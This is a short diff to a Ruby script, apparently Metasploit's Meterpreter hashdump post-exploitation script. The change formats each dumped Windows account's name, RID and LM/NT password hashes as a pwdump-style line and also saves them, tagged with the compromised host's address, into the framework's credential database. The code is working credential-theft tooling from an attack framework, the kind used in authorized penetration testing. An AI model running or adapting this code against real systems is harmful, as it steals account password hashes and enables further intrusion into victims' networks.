@@ -233,8 +233,16 @@ print_status("Dumping password hashes...")
 print_line()
 print_line()
 users.keys.sort{|a,b| a<=>b}.each do |rid|
-	print_line "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
-
+	hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
+	framework.db.report_auth_info(
+		:host  => client.sock.peerhost,
+		:proto => 'smb',
+		:user  => users[rid][:Name], 
+		:hash  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
+		:hash_string => hashstring,
+		:target_host => client.sock.peerhost
+	)
+	print_line hashstring
 end
 print_line()
 print_line()
